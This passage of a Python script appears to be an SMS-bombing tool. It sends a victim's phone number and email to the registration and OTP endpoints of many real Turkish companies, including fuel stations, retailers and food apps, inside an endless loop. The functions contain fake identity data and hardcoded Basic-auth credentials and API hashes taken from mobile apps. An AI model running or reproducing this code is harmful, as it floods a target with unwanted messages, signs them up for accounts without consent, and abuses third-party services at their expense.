        json={"accounttype": 1, "email": eposta, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": phone}
        r = requests.post(url, json=json)
        if (r.json()["isSucceed"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com")
        
        
#terrapizza.com.tr
def Terra(phone, eposta):
    try:
        url = "https://api.terrapizza.com.tr:443/api/v1/customers"
        json={"email": eposta, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
        r = requests.post(url,  json=json)
        if (r.status_code) == 201:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr")
        
        
#ipragaz.com.tr
def IpraGaz(phone):
    try:
        url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(phone), "playerId": ""}
        r = requests.post(url, json=json)
        if (r.json()["phoneNumber"]) == str(phone):
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr")
        
            
#mogazmobilapinew.aygaz.com.tr
def Mogaz(phone, eposta):
    try:
        url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
        json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": eposta, "isUserAgreement": True, "name": "Memati", "password": "", "phone": phone, "productType": 1, "subscription": True, "surname": "Bas"}
        r = requests.post(url, json=json)
        if (r.json()["messageCode"]) == "OK":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr")
        
        
#ipragaz.com.tr
def GoMobile(phone):
    try:
        r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={phone}&isRegistered=true")
        if (r.json()["data"]["success"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gomobilapp.ipragaz.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr")
        

#petrolofisi.com.tr
def PetrolOfisi(phone):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
        json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
        r = requests.post(url, headers=headers, json=json)
        if r.status_code == 204:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr")
        

#totalistasyonlari.com.tr
def Total(phone):
    try:
        r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={phone}&api_key=GetDocuments%0A", verify=False)
        if (r.json()["success"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.totalistasyonlari.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr")
        
        
#opet.com.tr
def Opet(phone, eposta):
    try:
        url = "https://api.opet.com.tr:443/api/authentication/register"
        json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": eposta, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
        r = requests.post(url, json=json)
        if (r.status_code) == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.opet.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr")


#dolap.com
def Dolap(phone, eposta):
    try:
        url = "https://api-gateway.dolap.com:443/member"
        headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
        json={"advertisingId": "", "campaignAgreement": False, "email": eposta, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": phone}
        r = requests.put(url, headers=headers, json=json)
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api-gateway.dolap.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com")
        

#heymobility.tech
def Hey(phone):
    try:
        headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
        r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone}", headers=headers)
        if (r.json()["IsSuccess"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> heyapi.heymobility.tech")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech")
        

#tazi.tech
def Tazi(phone):
    try:
        url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
        json={"cep_tel": phone, "cep_tel_ulkekod": "90"}
        r = requests.post(url, headers=headers, json=json)
        if (r.json()["kod"]) == "0000":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapiv2.tazi.tech")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech")
        

#isbike.istanbul
def Isbike(phone):
    try:
        url = "http://app.isbike.istanbul:80/api/uye/otpsms"
        headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
        json={"cep_tel": phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
        r = requests.post(url, headers=headers, json=json)
        if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.isbike.istanbul")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.isbike.istanbul")
        

#n11.com
def N11(phone, eposta):
    try:
        url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
        headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
        json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": eposta, "gsmNumber": phone, "userType": "BUYER"}
        r = requests.post(url, headers=headers, json=json)
        if (r.json()["isSuccess"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobileapi.n11.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com")
        

#joker.com.tr
def Joker(phone):
    try:
        url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
        data = {"phone": phone}
        r = requests.post(url, headers=headers, data=data)
        if (r.json()["success"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> joker.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr")


#e-bebek.com
def Ebebek(phone, eposta):
    try:
        r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
        auth = (r.json()["access_token"])
        url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
        headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
        json={"email": eposta, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": phone}
        r = requests.post(url, headers=headers, json=json)
        if r.json()["status"] == "SUCCESS":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com")


#sakasu.com.tr
def Saka(phone):
    try:
        url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
        json={"gsm": phone}
        r = requests.post(url, json=json)
        if (r.json()["status"]) == 1 :
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr")
        

#gofody.com
def Gofody(phone):
    try:
        url = "https://backend.gofody.com:443/api/v1/enduser/register/"
        json={"country_code": "90", "phone": phone}
        r = requests.post(url, json=json)
        if (r.json()["success"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com")


#madamecoco.com
def Madame(phone, eposta):
    try:
        url = "https://www.madamecoco.com:443/users/registration/"
        headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
        data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{eposta}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{phone}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
        r = requests.post(url, headers=headers, data=data)
        if (r.status_code) == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com")
        
        
#balikesiruludag.com.tr
def Buludag(phone):
    try:
        r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={phone}")
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr")   
        

#evidea.com
def Evidea(phone, eposta):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
        data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{eposta}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
        r = requests.post(url, headers=headers, data=data)      
        if r.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com")
        

#koctas.com.tr
def Koctas(phone):
    try:
        url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
        data = {"givePermission": "true", "mobileNumber": phone}
        r = requests.post(url, data=data)
        if (r.json()["status"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> occ2.koctas.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr")
        
        
#gratis.com
def Gratis(phone, eposta):
    try:
        token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
        url = "https://ivt.mobildev.com:443/data/0e80tyg8"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
        json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": eposta, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
        r = requests.post(url, headers=headers, json=json)
        if (r.status_code) == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com")

while True:
    for i in range(int(threadsayi)):
        Dsmartgo(numara)
        Kigili(numara, mail)
        KahveDunyasi(numara)
        NaosStars(numara, mail)
        Wmf(numara, mail)
        IsteGelsin(numara)
        Bim(numara)
        Sok(numara)
        Tiklagelsin(numara)
        Migros(numara)
        A101(numara)
        Englishhome(numara, mail)
        Sakasu(numara)
        Rentiva(numara)
        Bineq(numara)
        Link(numara)
        Lonca(numara)
        Dgn(numara)
        Yaani(numara, mail)
        Defacto(numara)
        Mopas(numara)
        Icq(numara)
        Boyner(numara, mail)
        Watsons(numara)
        Buyur(numara)
        Osmanlideal(numara, mail)
        Pinar(numara)
        Suiste(numara)
        Hayat(numara)
        Pisir(numara)
        KimGb(numara)
        IkinciYeni(numara, mail)
        Terra(numara, mail)
        IpraGaz(numara),
        Mogaz(numara, mail)
        GoMobile(numara)
        PetrolOfisi(numara)
        Total(numara)
        Opet(numara, mail)
        Dolap(numara, mail)
        Hey(numara)
        Tazi(numara)
        Isbike(numara)
        N11(numara, mail)
        Joker(numara)
        Ebebek(numara, mail)
        Saka(numara)
        Gofody(numara)
        Madame(numara, mail)
        Buludag(numara)
        Evidea(numara, mail)
        Koctas(numara)
        Gratis(numara, mail)
